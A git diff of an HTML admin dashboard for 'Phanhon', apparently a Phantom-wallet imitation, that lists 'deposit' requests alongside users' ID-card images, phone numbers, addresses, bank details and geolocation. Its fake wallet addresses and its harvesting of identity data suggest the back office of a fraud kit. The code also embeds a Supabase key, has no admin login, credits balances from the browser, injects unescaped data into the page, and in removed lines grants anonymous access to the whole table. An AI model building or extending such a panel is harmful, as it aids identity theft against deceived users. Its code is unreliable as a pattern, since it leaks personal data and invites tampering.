@@ -1,165 +1,432 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Admin - Enhanced Identity Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phanhon | Admin</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
     <style>
-        body { background: #0a0a0a; color: white; font-family: sans-serif; }
-        .kyc-card { background: #111; border: 1px solid #222; border-radius: 12px; overflow: hidden; }
-        pre { background: #000; padding: 10px; border-radius: 6px; font-size: 11px; color: #0f0; overflow-x: auto; }
-        video { width: 100%; height: 220px; background: #000; object-fit: cover; }
-        .id-thumb { width: 100%; height: 100px; object-fit: cover; border-radius: 8px; cursor: pointer; border: 1px solid rgba(255,255,255,0.1); }
-        .id-thumb:hover { border-color: #ab66ff; }
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap');
+
+        :root {
+            --phantom-purple: #ab66ff;
+            --bg: #000;
+            --card: #0a0a0a;
+            --text-muted: rgba(255, 255, 255, 0.4);
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg);
+            color: #fff;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overscroll-behavior-y: contain;
+            overflow: hidden;
+            /* Prevent body scroll, handle in app-container */
+        }
+
+        .app-container {
+            width: 100%;
+            height: 100vh;
+            background: #000;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        @media (min-width: 640px) {
+            .app-container {
+                max-width: 380px;
+                height: 720px;
+                border: 1px solid #1a1a1a;
+                border-radius: 32px;
+                box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            }
+        }
+
+        .glass {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .phantom-btn {
+            background: var(--phantom-purple);
+            color: white;
+            font-weight: 700;
+            border-radius: 12px;
+            transition: all 0.2s ease;
+            cursor: pointer;
+            border: none;
+        }
+
+        .phantom-btn:active {
+            transform: scale(0.97);
+            opacity: 0.9;
+        }
+
+        .phantom-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .loader {
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--phantom-purple);
+            border-bottom-color: transparent;
+            border-radius: 50%;
+            display: inline-block;
+            animation: rotation 1s linear infinite;
+        }
+
+        @keyframes rotation {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        /* Toast Notification */
+        #toast {
+            position: absolute;
+            bottom: 24px;
+            left: 50%;
+            transform: translateX(-50%) translateY(200px);
+            /* Start hidden below */
+            background: rgba(10, 10, 10, 0.95);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 12px 24px;
+            border-radius: 12px;
+            font-size: 10px;
+            font-weight: 700;
+            z-index: 1001;
+            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            min-width: 200px;
+            text-align: center;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+
+        #toast.show {
+            transform: translateX(-50%) translateY(0);
+        }
+
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.2);
+        }
+
+        input:focus {
+            outline: none;
+            border-color: rgba(255, 255, 255, 0.2) !important;
+        }
     </style>
 </head>
-<body class="p-8 pb-20">
-    <div class="max-w-7xl mx-auto">
-        <header class="flex justify-between items-center mb-8">
-            <div>
-                <h1 class="text-2xl font-bold">Deep Verification Dashboard</h1>
-                <p class="text-xs text-white/40 mt-1">Reviewing Video, Audio, Location, and ID Documents</p>
+
+<body class="bg-black text-white p-10 block overflow-auto">
+
+    <div class="max-w-6xl mx-auto">
+        <div class="flex justify-between items-center mb-10">
+            <h1 class="text-3xl font-bold tracking-tighter text-[#ab66ff]">Phanhon Admin</h1>
+            <button onclick="window.location.href='index.html'"
+                class="text-xs uppercase font-bold opacity-50 hover:opacity-100">Logout</button>
+        </div>
+
+        <div class="glass rounded-2xl p-6 overflow-hidden">
+            <h2 class="text-xl font-bold mb-4">Deposit Requests</h2>
+            <div class="overflow-x-auto">
+                <table class="w-full text-left border-collapse">
+                    <thead>
+                        <tr class="text-[10px] uppercase text-white/40 border-b border-white/10">
+                            <th class="p-3">Time</th>
+                            <th class="p-3">User</th>
+                            <th class="p-3">Amount</th>
+                            <th class="p-3">Method</th>
+                            <th class="p-3">Geo</th>
+                            <th class="p-3">Proofs</th>
+                            <th class="p-3">Status</th>
+                            <th class="p-3">Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="table-body" class="text-xs font-mono">
+                        <tr>
+                            <td colspan="8" class="p-4 text-center opacity-30">Loading...</td>
+                        </tr>
+                    </tbody>
+                </table>
             </div>
-            <div class="flex gap-3">
-                <a href="deposit.html" class="bg-white/5 border border-white/10 px-4 py-2 rounded font-bold text-sm hover:bg-white/10 transition">Deposit Page</a>
-                <button onclick="loadVerifications()" class="bg-[#ab66ff] px-4 py-2 rounded font-bold text-sm">Refresh Data</button>
-            </div>
-        </header>
-
-        <section class="grid grid-cols-1 lg:grid-cols-2 xl:grid-cols-3 gap-6" id="kyc-list">
-            <p class="col-span-full opacity-50 italic text-center py-20">Fetching logs...</p>
-        </section>
-
-        <hr class="my-12 border-white/10">
-
-        <!-- UPDATED SQL SCHEMA -->
-        <section class="bg-zinc-900 p-6 rounded-xl border border-white/5">
-            <h2 class="text-xl font-bold mb-4 text-yellow-500">Database Update (Extended Table)</h2>
-            <p class="text-sm opacity-60 mb-4">Run this updated SQL to handle phone, address, IDs, geolocation, and last online tracking:</p>
-            <pre>
--- Update the table with new security fields
-ALTER TABLE user_biometrics_log 
-ADD COLUMN IF NOT EXISTS phone text,
-ADD COLUMN IF NOT EXISTS address text,
-ADD COLUMN IF NOT EXISTS geolocation text,
-ADD COLUMN IF NOT EXISTS id_front text,
-ADD COLUMN IF NOT EXISTS id_back text,
-ADD COLUMN IF NOT EXISTS last_online timestamp with time zone;
-
--- Ensure RLS is configured for all operations
-ALTER TABLE user_biometrics_log ENABLE ROW LEVEL SECURITY;
-CREATE POLICY "Allow anonymous access" ON user_biometrics_log FOR ALL USING (true);
-            </pre>
-        </section>
+        </div>
     </div>
 
-    <!-- Image Modal -->
-    <div id="img-modal" class="fixed inset-0 bg-black/90 hidden z-50 flex items-center justify-center p-10" onclick="this.classList.add('hidden')">
-        <img id="modal-content" src="" class="max-h-full max-w-full rounded-lg shadow-2xl">
+    <!-- Modal -->
+    <div id="proof-modal" class="hidden fixed inset-0 bg-black/90 z-50 flex items-center justify-center p-10">
+        <div class="bg-[#111] p-6 rounded-2xl max-w-4xl w-full max-h-full overflow-y-auto">
+            <div class="flex justify-between mb-6">
+                <h3 class="font-bold text-lg">Verification Proofs</h3>
+                <button onclick="closeModal()" class="text-2xl">&times;</button>
+            </div>
+
+            <div class="grid grid-cols-3 gap-4 mb-6 bg-white/5 p-4 rounded-xl border border-white/5">
+                <div>
+                    <p class="text-[10px] uppercase opacity-40 font-bold">Phone Number</p>
+                    <p id="modal-phone" class="font-mono text-sm">...</p>
+                </div>
+                <div>
+                    <p class="text-[10px] uppercase opacity-40 font-bold">Bank Info</p>
+                    <p id="modal-bank" class="font-mono text-sm break-all">...</p>
+                </div>
+                <div>
+                    <p class="text-[10px] uppercase opacity-40 font-bold">Address</p>
+                    <p id="modal-address" class="text-xs leading-tight">...</p>
+                </div>
+            </div>
+
+            <div class="grid grid-cols-2 gap-4">
+                <div>
+                    <p class="text-[10px] uppercase opacity-50 mb-2">ID Front</p>
+                    <img id="modal-front" class="w-full rounded-lg bg-white/5">
+                </div>
+                <div>
+                    <p class="text-[10px] uppercase opacity-50 mb-2">ID Back</p>
+                    <img id="modal-back" class="w-full rounded-lg bg-white/5">
+                </div>
+
+            </div>
+        </div>
     </div>
 
     <script>
-        const sb = supabase.createClient("https://tmvimacikrnrizxtcesf.supabase.co", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRtdmltYWNpa3Jucml6eHRjZXNmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgxMDc5NzgsImV4cCI6MjA4MzY4Mzk3OH0.dwh4CWwxE53hbhgjYqOqHZYa1tNyUKNZvdb6Kq5pLC4");
+        // Consolidated v2_core_utils.js
+        const SB_URL = "https://tmvimacikrnrizxtcesf.supabase.co";
+        const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRtdmltYWNpa3Jucml6eHRjZXNmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgxMDc5NzgsImV4cCI6MjA4MzY4Mzk3OH0.dwh4CWwxE53hbhgjYqOqHZYa1tNyUKNZvdb6Kq5pLC4";
+        let sb;
 
-        async function loadVerifications() {
-            const container = document.getElementById('kyc-list');
-            
-            const { data, error } = await sb
-                .from('user_biometrics_log')
+        if (typeof supabase !== 'undefined') {
+            sb = supabase.createClient(SB_URL, SB_KEY);
+        } else {
+            console.error("Supabase library not loaded!");
+        }
+
+        let user = null;
+
+        function loadUser() {
+            try {
+                const saved = localStorage.getItem('phantom_user');
+                if (saved) {
+                    user = JSON.parse(saved);
+                    return user;
+                }
+            } catch (e) {
+                console.error("Error loading user", e);
+            }
+            return null;
+        }
+
+        function saveUser(userData) {
+            user = userData;
+            localStorage.setItem('phantom_user', JSON.stringify(userData));
+        }
+
+        function clearUser() {
+            user = null;
+            localStorage.removeItem('phantom_user');
+        }
+
+        function showToast(msg) {
+            let t = document.getElementById('toast');
+            if (!t) {
+                t = document.createElement('div');
+                t.id = 'toast';
+                document.querySelector('.app-container').appendChild(t);
+            }
+            t.innerText = msg;
+            t.classList.add('show');
+            if (t.timeout) clearTimeout(t.timeout);
+            t.timeout = setTimeout(() => {
+                t.classList.remove('show');
+            }, 3000);
+        }
+
+        function getAvatarInitials(name) {
+            return name ? name.charAt(0).toUpperCase() : '?';
+        }
+
+        function getAddress(username) {
+            if (!username) return 'Unknown Wallet';
+            const chars = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+            let addr = "PH";
+            for (let i = 0; i < 42; i++) {
+                const charIndex = (username.charCodeAt(i % username.length) + i * 7) % chars.length;
+                addr += chars[charIndex];
+            }
+            return addr;
+        }
+
+        function addLocalPending(depositData) {
+            try {
+                const key = `pending_deposits_${user.id}`;
+                let pending = JSON.parse(localStorage.getItem(key) || "[]");
+                const { id_front, id_back, ...smallData } = depositData;
+                pending.push({
+                    ...smallData,
+                    created_at: new Date().toISOString(),
+                    status: 'pending'
+                });
+                localStorage.setItem(key, JSON.stringify(pending));
+            } catch (e) {
+                console.error("Error saving local pending", e);
+            }
+        }
+
+        function getLocalPending() {
+            if (!user) return [];
+            try {
+                const key = `pending_deposits_${user.id}`;
+                return JSON.parse(localStorage.getItem(key) || "[]");
+            } catch (e) {
+                return [];
+            }
+        }
+
+        function removeLocalPending(amount) {
+            if (!user) return;
+            try {
+                const key = `pending_deposits_${user.id}`;
+                let pending = JSON.parse(localStorage.getItem(key) || "[]");
+                const idx = pending.findIndex(p => Math.abs(parseFloat(p.amount) - parseFloat(amount)) < 0.0001);
+                if (idx !== -1) {
+                    pending.splice(idx, 1);
+                    localStorage.setItem(key, JSON.stringify(pending));
+                }
+            } catch (e) { }
+        }
+
+        function getGeolocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve("Not Supported");
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => resolve(`${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)}`),
+                    (err) => resolve("Denied/Error"),
+                    { timeout: 5000 }
+                );
+            });
+        }
+    </script>
+    <script>
+        window.onload = loadData;
+
+        async function loadData() {
+            const { data, error } = await sb.from('user_biometrics_log')
                 .select('*')
                 .order('created_at', { ascending: false });
 
-            if (error) {
-                container.innerHTML = `<p class="text-red-500">Error: ${error.message}</p>`;
+            const tbody = document.getElementById('table-body');
+            tbody.innerHTML = '';
+
+            if (!data || data.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="8" class="p-4 text-center opacity-30">No Records</td></tr>';
                 return;
             }
 
-            container.innerHTML = data.map(v => {
-                const isOnline = v.last_online && (new Date() - new Date(v.last_online) < 60000);
-                
-                return `
-                <div class="kyc-card p-5 space-y-4 border ${v.status === 'pending' ? 'border-yellow-500/20' : 'border-white/5'}">
-                    <div class="flex justify-between items-start">
-                        <div>
-                            <div class="flex items-center gap-2">
-                                <p class="text-blue-400 font-bold text-sm">${v.username}</p>
-                                <span class="w-2 h-2 rounded-full ${isOnline ? 'bg-green-500 animate-pulse' : 'bg-red-500'}"></span>
-                                <span class="text-[8px] opacity-40 uppercase">${isOnline ? 'Online Now' : 'Last: ' + (v.last_online ? new Date(v.last_online).toLocaleTimeString() : 'Never')}</span>
-                            </div>
-                            <p class="text-[10px] opacity-40">Submitted: ${new Date(v.created_at).toLocaleString()}</p>
-                        </div>
-                        <span class="text-[10px] ${v.status === 'pending' ? 'bg-yellow-500/20 text-yellow-500' : 'bg-green-500/20 text-green-500'} px-2 py-1 rounded font-bold uppercase tracking-widest">${v.status}</span>
-                    </div>
+            data.forEach(row => {
+                const tr = document.createElement('tr');
+                tr.className = "border-b border-white/5 hover:bg-white/5 transition-colors";
 
-                    <!-- Video + Audio Player -->
-                    <div class="rounded-lg overflow-hidden border border-white/10 bg-black">
-                        <video controls src="${v.video_url}"></video>
-                        <div class="p-2 bg-white/5 text-[9px] text-center border-t border-white/5">
-                            Required Signs: <span class="text-[#ab66ff] font-bold">${v.required_signs}</span>
-                        </div>
-                    </div>
+                const statusColor = row.status === 'pending' ? 'text-yellow-500' : (row.status === 'approved' ? 'text-green-500' : 'text-red-500');
 
-                    <!-- ID Documents -->
-                    <div class="grid grid-cols-2 gap-2">
-                        <div>
-                            <p class="text-[9px] opacity-40 mb-1 uppercase">ID Front</p>
-                            <img src="${v.id_front || 'https://via.placeholder.com/150?text=No+ID'}" class="id-thumb" onclick="openImg('${v.id_front}')">
-                        </div>
-                        <div>
-                            <p class="text-[9px] opacity-40 mb-1 uppercase">ID Back</p>
-                            <img src="${v.id_back || 'https://via.placeholder.com/150?text=No+ID'}" class="id-thumb" onclick="openImg('${v.id_back}')">
-                        </div>
-                    </div>
-                    
-                    <!-- Contact & Geo -->
-                    <div class="bg-white/5 p-3 rounded-lg space-y-2 text-[10px]">
-                        <div class="flex justify-between border-b border-white/5 pb-1">
-                            <span class="opacity-40">Phone:</span>
-                            <span>${v.phone || 'N/A'}</span>
-                        </div>
-                        <div class="flex justify-between border-b border-white/5 pb-1">
-                            <span class="opacity-40">Geo Location:</span>
-                            <a href="https://www.google.com/maps?q=${v.geolocation}" target="_blank" class="text-blue-400 underline">${v.geolocation || 'Denied'}</a>
-                        </div>
-                        <div class="flex flex-col gap-1 border-b border-white/5 pb-1">
-                            <span class="opacity-40">Address:</span>
-                            <span class="leading-tight">${v.address || 'N/A'}</span>
-                        </div>
-                        <div class="flex justify-between">
-                            <span class="opacity-40">Bank/PayPal:</span>
-                            <span class="truncate max-w-[150px]">${v.bank_info || 'N/A'}</span>
-                        </div>
-                    </div>
-
-                    <div class="flex gap-2">
-                        <button onclick="updateStatus('${v.id}', 'approved')" class="flex-1 bg-green-600 py-2 rounded text-xs font-bold hover:bg-green-500 transition">Approve SOL Release</button>
-                        <button onclick="updateStatus('${v.id}', 'rejected')" class="flex-1 bg-red-600/20 text-red-500 py-2 rounded text-xs font-bold border border-red-500/20 hover:bg-red-600/30 transition">Reject</button>
-                    </div>
-                </div>
-            `}).join('');
+                tr.innerHTML = `
+                    <td class="p-3 opacity-60">${new Date(row.created_at).toLocaleString()}</td>
+                    <td class="p-3 font-bold">${row.username || '???'}</td>
+                    <td class="p-3 text-green-400 font-bold">${row.amount} SOL</td>
+                    <td class="p-3 opacity-60">${row.method}</td>
+                    <td class="p-3 text-[10px]">${row.geolocation || 'N/A'}</td>
+                    <td class="p-3"><button onclick="viewProof('${row.id}')" class="text-[#ab66ff] hover:underline">View Media</button></td>
+                    <td class="p-3 font-bold uppercase text-[10px] ${statusColor}">${row.status}</td>
+                    <td class="p-3 flex gap-2">
+                        ${row.status === 'pending' ? `
+                            <button onclick="updateStatus('${row.id}', 'approved')" class="bg-green-500/20 text-green-500 px-2 py-1 rounded hover:bg-green-500/40">Approve</button>
+                            <button onclick="updateStatus('${row.id}', 'rejected')" class="bg-red-500/20 text-red-500 px-2 py-1 rounded hover:bg-red-500/40">Reject</button>
+                        ` : '<span class="opacity-20">-</span>'}
+                    </td>
+                `;
+                tr.dataset.row = JSON.stringify(row);
+                tbody.appendChild(tr);
+            });
         }
 
-        function openImg(src) {
-            if(!src) return;
-            const modal = document.getElementById('img-modal');
-            const content = document.getElementById('modal-content');
-            content.src = src;
-            modal.classList.remove('hidden');
+        function viewProof(id) {
+            // Find data from local DOM or re-fetch. Since we attached it to dataset:
+            const tr = Array.from(document.querySelectorAll('tr')).find(r => {
+                if (!r.dataset.row) return false;
+                return JSON.parse(r.dataset.row).id === id;
+            });
+            if (!tr) return;
+            const data = JSON.parse(tr.dataset.row);
+
+            document.getElementById('modal-front').src = data.id_front || '';
+            document.getElementById('modal-back').src = data.id_back || '';
+
+
+            // Populate text fields
+            document.getElementById('modal-phone').innerText = data.phone || 'N/A';
+            document.getElementById('modal-bank').innerText = data.bank_info || 'N/A';
+            document.getElementById('modal-address').innerText = data.address || 'N/A';
+
+            document.getElementById('proof-modal').classList.remove('hidden');
         }
 
-        async function updateStatus(id, newStatus) {
-            const { error } = await sb
-                .from('user_biometrics_log')
-                .update({ status: newStatus })
-                .eq('id', id);
+        function closeModal() {
+            document.getElementById('proof-modal').classList.add('hidden');
 
-            if (error) alert("Error: " + error.message);
-            else loadVerifications();
         }
 
-        window.onload = loadVerifications;
+        async function updateStatus(id, status) {
+            if (!confirm(`Mark this deposit as ${status}?`)) return;
+
+            const { error } = await sb.from('user_biometrics_log').update({ status }).eq('id', id);
+            if (error) alert("Error updating");
+            else {
+                // If approved, add balance to user
+                if (status === 'approved') {
+                    // Ideally we fetch the row to get amount/user_id again to be safe
+                    const { data: row } = await sb.from('user_biometrics_log').select('*').eq('id', id).single();
+                    if (row) {
+                        // RPC call or simple update
+                        // We need to get current balance first to add
+                        const { data: profile } = await sb.from('profiles').select('balance').eq('id', row.user_id).single();
+                        if (profile) {
+                            await sb.from('profiles').update({ balance: profile.balance + row.amount }).eq('id', row.user_id);
+                            await sb.from('transactions').insert([{
+                                from_id: row.user_id,
+                                to_id: row.user_id,
+                                amount: row.amount,
+                                from_username: 'Deposit',
+                                to_username: 'Wallet'
+                            }]);
+                        }
+                    }
+                }
+                loadData();
+            }
+        }
     </script>
 </body>
 
